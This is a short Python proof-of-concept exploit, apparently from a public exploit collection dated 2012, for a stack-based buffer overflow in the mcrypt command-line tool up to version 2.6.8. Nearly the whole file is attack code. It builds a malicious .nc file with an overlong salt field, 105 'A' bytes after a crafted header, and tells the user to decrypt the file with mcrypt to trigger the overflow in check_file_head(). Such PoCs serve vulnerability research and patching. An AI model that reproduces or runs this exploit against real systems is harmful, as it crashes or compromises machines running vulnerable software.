#!/usr/bin/env python

# mcrypt <= 2.6.8 stack-based buffer overflow poc
# http://mcrypt.sourceforge.net/
# (the command line tool, not the library)
#
# date: 2012-09-04
# exploit author: _ishikawa
# tested on: ubuntu 12.04.1
# tech: it overflows in check_file_head() when decrypting .nc files with too long salt data
#
# shout-outs to all cryptoparty people

import sys

sprawl = 105
gibson = "\x00\x6d\x03\x40\x73\x65\x72\x70\x65\x6e\x74\x00\x20\x00\x63\x62"
gibson += "\x63\x00\x6d\x63\x72\x79\x70\x74\x2d\x73\x68\x61\x31\x00"
gibson += chr(sprawl)
gibson += ("A" * sprawl)
gibson += (chr(0) * 3)

try:
  count0 = open("cyberpunk.nc", "wb")
  count0.write(gibson)
  count0.close()
except IOError:
  print "file error"
  sys.exit(1)

print "now run  mcrypt -d cyberpunk.nc"